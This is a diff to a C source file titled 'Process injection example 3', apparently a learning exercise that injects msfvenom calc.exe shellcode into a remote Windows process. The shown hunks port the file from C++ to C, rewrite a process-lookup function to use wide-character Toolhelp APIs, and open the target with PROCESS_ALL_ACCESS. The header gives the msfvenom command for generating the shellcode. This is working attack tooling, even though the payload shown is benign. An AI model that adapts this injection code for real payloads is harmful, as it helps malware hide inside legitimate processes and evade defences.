@@ -1,34 +1,38 @@
 /*
 * Process injection example 3: injecting calc.exe msfvenom shellcode into a remote process
 * shellcode: msfvenom -p windows/x64/exec CMD=calc.exe -f C EXITFUNC=thread
-* compile: cl.exe injection-example-3.cpp  /D"_UNICODE" /D"UNICODE" /W0
+* compile: cl.exe injection-example-3.c  /D"_UNICODE" /D"UNICODE" /W0
 */
 #include <windows.h>
 #include <stdio.h>
+#include <stdbool.h>
 #include <tlhelp32.h>
 
 // Adapted from Pavel Yosifovich's Enumerate Processes (part 1): https://www.youtube.com/watch?v=IZULG6I4z5U
-DWORD FindPidByName(LPCWSTR processName) {
-    DWORD foundpid = 0;
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) {
-        return foundpid;
+DWORD FindPidByName(const wchar_t* processName) {
+    DWORD pid = 0;
+    // Force the Wide-character version of the struct
+    PROCESSENTRY32W entry; 
+    entry.dwSize = sizeof(PROCESSENTRY32W);
+
+    // Create a snapshot of the system processes
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+    if (snapshot != INVALID_HANDLE_VALUE) {
+        // Force the Wide-character version of the API
+        if (Process32FirstW(snapshot, &entry)) {
+            do {
+                // Now both sides are Wide strings, so _wcsicmp works!
+                //if (_wcsicmp(processName, entry.szExeFile) == 0) {
+                if (lstrcmpiW(processName, entry.szExeFile) == 0) {
+                    pid = entry.th32ProcessID;
+                    break;
+                }
+            } while (Process32NextW(snapshot, &entry));
+        }
+        CloseHandle(snapshot);
     }
-
-    PROCESSENTRY32 pe;
-    pe.dwSize = sizeof(PROCESSENTRY32);
-
-    if (Process32First(hSnapshot, &pe)) {
-        do {
-            if (_wcsicmp(processName, pe.szExeFile) == 0) {
-                foundpid = pe.th32ProcessID;
-                break;
-            }
-        } while (Process32Next(hSnapshot, &pe));
-    }
-
-    CloseHandle(hSnapshot);
-    return foundpid;
+    return pid;
 }
 
 int main() {
@@ -66,7 +70,7 @@ int main() {
     printf("[*] Running PI with target PID: %u\n", pid);
 
     // Open a handle to the current process, this must be passed to VirtualAllocEx
-    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
+    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (pHandle == NULL) {
         printf("Failed to acquire process handle!\n");
         return -1;
